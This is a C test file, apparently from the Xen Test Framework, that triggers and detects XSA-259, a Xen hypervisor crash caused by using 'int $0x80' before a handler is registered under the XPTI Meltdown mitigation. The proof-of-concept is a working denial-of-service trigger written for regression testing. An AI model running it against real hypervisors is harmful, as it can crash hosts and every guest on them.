/**
 * @file tests/xsa-259/main.c
 * @ref test-xsa-259
 *
 * @page test-xsa-259 XSA-259
 *
 * Advisory: [XSA-259](http://xenbits.xen.org/xsa/advisory-259.html)
 *
 * The Meltdown mitigation work (XPTI) didn't correctly deal with an error
 * path connecting the `int $0x80` special case handing with general exception
 * handling, which causes Xen to write 0 to an address near 2^64, and suffer a
 * fatal pagefault.
 *
 * The bug can be triggered by using `int $0x80` before registering a handler
 * with Xen.  If vulnerable, Xen will crash.
 *
 * @see tests/xsa-259/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-259 PoC";

void test_main(void)
{
    exinfo_t fault = 0;

    asm volatile ("1: int $0x80; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, ex_record_fault_eax)
                  : "+a" (fault)
                  : "X" (ex_record_fault_eax));

    /*
     * If Xen is vulnerable, it should have crashed.  If Xen is not
     * vulnerable, we should have got #GP[0x80|IDT] from the attempt to use a
     * misconfigured IDT entry.
     */
    if ( fault != EXINFO_SYM(GP, (0x80 << 3) | X86_EC_IDT) )
        return xtf_error("Error: Unexpected fault %#x, %pe\n",
                         fault, _p(fault));

    xtf_success("Success: Not vulnerable to XSA-259\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
